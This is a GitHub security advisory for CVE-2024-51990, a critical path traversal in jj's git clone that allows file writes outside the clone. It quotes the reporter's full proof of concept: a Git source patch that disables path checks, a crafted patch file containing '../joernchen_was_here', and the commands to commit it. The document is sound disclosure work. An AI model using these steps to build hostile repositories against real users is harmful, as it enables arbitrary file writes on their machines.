=== Content from github.com_36ccb804_20250115_093033.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjj-vcs%2Fjj%2Fsecurity%2Fadvisories%2FGHSA-88h5-6w7m-5w56)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjj-vcs%2Fjj%2Fsecurity%2Fadvisories%2FGHSA-88h5-6w7m-5w56)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=jj-vcs%2Fjj)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[jj-vcs](/jj-vcs)
/
**[jj](/jj-vcs/jj)**
Public

* [Notifications](/login?return_to=%2Fjj-vcs%2Fjj) You must be signed in to change notification settings
* [Fork
  374](/login?return_to=%2Fjj-vcs%2Fjj)
* [Star
   10.5k](/login?return_to=%2Fjj-vcs%2Fjj)

* [Code](/jj-vcs/jj)
* [Issues
  395](/jj-vcs/jj/issues)
* [Pull requests
  118](/jj-vcs/jj/pulls)
* [Discussions](/jj-vcs/jj/discussions)
* [Actions](/jj-vcs/jj/actions)
* [Projects
  1](/jj-vcs/jj/projects)
* [Wiki](/jj-vcs/jj/wiki)
* [Security](/jj-vcs/jj/security)
* [Insights](/jj-vcs/jj/pulse)

Additional navigation options

* [Code](/jj-vcs/jj)
* [Issues](/jj-vcs/jj/issues)
* [Pull requests](/jj-vcs/jj/pulls)
* [Discussions](/jj-vcs/jj/discussions)
* [Actions](/jj-vcs/jj/actions)
* [Projects](/jj-vcs/jj/projects)
* [Wiki](/jj-vcs/jj/wiki)
* [Security](/jj-vcs/jj/security)
* [Insights](/jj-vcs/jj/pulse)

# Path traversal via crafted Git repositories

Critical

[martinvonz](/martinvonz)
published
GHSA-88h5-6w7m-5w56
Nov 6, 2024

## Package

No package listed

## Affected versions

<0.23.0

## Patched versions

0.23.0

## Description

### Impact

Specially crafted Git repositories can cause `jj` to write files outside the clone.

### Patches

Fixed in 0.23.0.

### Workarounds

Not much other than to not clone repositories from untrusted sources.

### References

Here's the original report from [@joernchen](https://github.com/joernchen) (I have since enabled "Private vulnerability reporting" here on GitHub so people can report issues themselves):

When cloning a crafted Git repository it is possible to let `jj` write

into arbitrary directories. This can be achieved by having file objects

which contain path traversals.

Reproduction steps:

Apply the following patch to Git version v.2.47.0:

```
diff --git a/path.c b/path.c
index 93491bab14..2f47e69fd1 100644
--- a/path.c
+++ b/path.c
@@ -44,11 +44,11 @@ struct strbuf *get_pathname(void)

 static const char *cleanup_path(const char *path)
 {
-       /* Clean it up */
+       /* Clean it up
        if (skip_prefix(path, "./", &path)) {
                while (*path == '/')
                        path++;
-       }
+       }*/
        return path;
 }

@@ -1101,7 +1101,9 @@ int normalize_path_copy_len(char *dst, const char *src, int *prefix_len)

 int normalize_path_copy(char *dst, const char *src)
 {
-       return normalize_path_copy_len(dst, src, NULL);
+//     return normalize_path_copy_len(dst, src, NULL);
+       memcpy(dst, src, strlen(dst));
+       return 0;
 }

 int strbuf_normalize_path(struct strbuf *src)
diff --git a/read-cache.c b/read-cache.c
index 3c078afadb..2eb44cb26f 100644
--- a/read-cache.c
+++ b/read-cache.c
@@ -977,6 +977,7 @@ static enum verify_path_result verify_path_internal(const char *path,
                                                    unsigned mode)
 {
        char c = 0;
+       return PATH_OK;

        if (has_dos_drive_prefix(path))
                return PATH_INVALID;
```

With this patched `git` binary we can now apply a crafted

patch containing a path traversal to a repository.

The patch would look like:

```
From ecea96264bd3f9785e5ebec8640be4847ba28e22 Mon Sep 17 00:00:00 2001
From: joernchen <[joernchen@phenoelit.de](mailto:joernchen@phenoelit.de)>
Date: Sun, 13 Oct 2024 18:09:50 +0200
Subject: [PATCH] z123

---
 z | 0
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 z

diff --git a/../joernchen_was_here b/../joernchen_was_here
new file mode 100644
index 0000000..e69de29
--
2.46.1
```

Note the traversal `../joernchen_was_here` in the patch. This now can be committed to a repository

using the modified `git` binary:

```
mkdir demo
cd demo
git init
./path/to/modified/git/git --exec-path=./path/to/modified/git am the_traversal.patch
rm ../joernchen_was_here # remove the file the modified git wrote
```

Now, when cloning that repository with `jj git clone` the path traversal will write above the worktree

directory, allowing arbitrary file writes.

I've attached a tar.gz with the demo repo so you don't have to mess with the patched Git at all. For

reproduction it should be sufficient to do `jj git clone demo.git` after unpacking the tarball.

The demo repository after being cloned with `jj` will create an empty file `joernchen_was_here` right next

to the `demo` directory to demonstrate the traversal.

### Severity

Critical

### CVE ID

CVE-2024-51990

### Weaknesses

No CWEs

### Credits

* [![@joernchen](https://avatars.githubusercontent.com/u/1334559?s=40&v=4)](/joernchen)
  [joernchen](/joernchen)
  Finder
* [![@yuja](https://avatars.githubusercontent.com/u/172069?s=40&v=4)](/yuja)
  [yuja](/yuja)
  Remediation developer

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


